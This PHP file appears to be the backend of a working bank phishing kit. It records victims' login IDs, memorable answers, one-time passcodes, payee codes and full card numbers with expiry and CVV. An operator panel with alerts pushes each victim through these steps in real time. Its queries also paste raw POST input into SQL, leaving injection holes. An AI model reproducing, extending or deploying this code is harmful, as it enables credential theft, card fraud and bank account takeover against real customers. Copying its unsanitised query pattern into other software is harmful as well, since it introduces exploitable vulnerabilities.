<?php
include 'config.php';
include 'connect.php';



session_start();

function numeric($num){
	if (preg_match('/^[0-9]+$/', $num)) {
		$status = true;
	} else {
		$status = false;
	}
	return $status;
}

////////////////////////////////////// RESET THE BUZZ ON EACH SUBMITTED THING

if($_GET['type'] == 'login'){
	
	if($_POST['userid'] and $_POST['ip'] and $_POST['ua']){
		$userid = $_POST['userid'];
		$ip = $_POST['ip'];
		$ua = $_POST['ua'];
		
		$uniqueid = time();
		if($_SESSION['started'] == 'true'){
			$uniqueid = $_SESSION['uniqueid'];
			$query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, username='$userid', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
			
		}else{
			$_SESSION['uniqueid'] = $uniqueid;
			$_SESSION['started'] = 'true';
			$query = mysqli_query($conn, "INSERT INTO customers (username, ip, useragent,uniqueid, status) VALUES ('$userid', '$ip', '$ua',$uniqueid, 1)");
			if($query){
			
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}
		
		
		
		
		
		
	}
	

	
	
	
}




if($_SESSION['admin_logged'] == 'true'){
	if($_GET['type'] == 'commmand'){
		if($_POST['userid'] and numeric($_POST['userid']) == true and $_POST['status'] and numeric($_POST['status']) == true or $_POST['secword'] or $_POST['otpword'] or $_POST['payeecode']){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = $_POST['status'];
			
			$secword = $_POST['secword'];		
			$otpword = $_POST['otpword'];
			//question
			
			
			
			
			$cancelcode = $_POST['payeecode'];


			if($secword != null and $secword != '' and ($otpword == null or $otpword == '') and ($cancelcode == null or $cancelcode == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, question='$secword' WHERE id=$userid");
			}elseif($otpword != null and $otpword != '' and ($secword == null or $secword == '') and ($cancelcode == null or $cancelcode == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, otpword='$otpword' WHERE id=$userid");
			}elseif($cancelcode != null and $cancelcode != '' and ($secword == null or $secword == '') and ($otpword == null or $otpword == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, cancelcode='$cancelcode' WHERE id=$userid");
			}else{
				$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			}
			
			if($query){

				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}else{
		echo json_encode(array(
			'status' => 'notokk'
		));
		}

		
		
	}


	if(isset($_GET['get_submitted'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status=1 and buzzed=0");
		if($query){
			$num = mysqli_num_rows($query);
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			if($num >= 1){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}		
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}

	if(isset($_GET['buzzoff'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status=1");
		if($query){
			$array = array_filter(mysqli_fetch_all($query,MYSQLI_ASSOC));	
			foreach($array as $value){
				$userid = $value['id'];
				$queryy = mysqli_query($conn, "UPDATE customers SET buzzed=1 WHERE id=$userid");
				if($queryy){
					$stat = 'ok';
				}else{
					$stat = 'notok';
				}
			}
			if($stat == 'ok'){
				echo json_encode(array(
				'status' => 'ok'
			));
			}else{
				echo json_encode(array(
				'status' => 'notok'
			));
			}
			
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}
	
		if($_GET['type'] == 'delete'){
			if($_POST['userid'] and numeric($_POST['userid']) == true){
				$userid = $_POST['userid']; // the normal id not unique one
				
				$query = mysqli_query($conn, "DELETE FROM customers WHERE id=$userid");
				
				
				if($query){
					
					
					echo json_encode(array(
					'status' => 'ok'
					));
				}else{
					echo json_encode(array(
					'status' => 'notok'
					));
				}
			}else{
				echo json_encode(array(
					'status' => 'notokk'
				));
			}
		
		
	}
	
	
	if($_GET['type'] == 'submitted'){
		if($_POST['userid'] and numeric($_POST['userid']) == true){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = str_replace("_$userid","",$_POST['status']);

			if($status == 'accept'){
				$status = 11;
			}elseif($status == 'reject'){
				$status = 12;
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			
			}else{
					echo json_encode(array(
						'status' => 'notokk'
					));
			}
		
		
	}



}





if($_SESSION['started'] == 'true'){
	
	if($_GET['type'] == 'security'){
	if($_POST['memorableAnswer'] and $_POST['idv_OtpCredential'] and numeric($_POST['idv_OtpCredential']) == true){
		$memorable = $_POST['memorableAnswer'];
		$security = $_POST['idv_OtpCredential'];
		
		$uniqueid = $_POST['userid'];

		
		$query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, memorable='$memorable', security='$security' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		
		
	}
	
	
	
	}
	

	if($_GET['wait'] and numeric($_GET['wait']) == true){
		$id = $_GET['wait'];
		$query = mysqli_query($conn, "UPDATE customers SET status=0 WHERE uniqueid=$id");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
		
	
	

	if($_GET['getstatus'] and numeric($_GET['getstatus']) == true){
		$id = $_GET['getstatus'];
		$query = mysqli_query($conn, "SELECT * from customers WHERE uniqueid='$id'");
		
		if(mysqli_num_rows($query) >= 1){
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			echo $array['status'];
		}		
		
	}




if($_GET['type'] == 'otp'){
	if($_POST['otp'] and  $_POST['userid'] and numeric($_POST['userid']) == true and numeric($_POST['otp']) == true){
		$otp = $_POST['otp'];
		$uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET otp='$otp', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}




if($_GET['type'] == 'payee'){
	if($_POST['payeecode'] and  $_POST['userid'] and numeric($_POST['userid']) == true and numeric($_POST['payeecode']) == true){
		$payeecode = $_POST['payeecode'];
		$uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET payeecode='$payeecode', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}






if($_GET['type'] == 'card'){
	
	if($_POST['ccnum'] and numeric(str_replace(' ', '',$_POST['ccnum'])) == true and $_POST['CC_MM'] and numeric($_POST['CC_MM']) == true and $_POST['CC_YY'] and numeric($_POST['CC_YY']) == true and $_POST['CC_VV'] and numeric($_POST['CC_VV']) == true and $_POST['userid'] and numeric($_POST['userid']) == true){
		$uniqueid = $_POST['userid'];
		
		
		$ccnum = str_replace(' ', '',$_POST['ccnum']);
		$CC_MM = $_POST['CC_MM']; // month
		$CC_YY = $_POST['CC_YY']; // year
		$ccexp = $CC_MM.'/'.$CC_YY;
		$CC_VV = $_POST['CC_VV'];

		 // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET ccnumber='$ccnum', ccexp='$ccexp', cvv='$CC_VV', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
	
	
}



}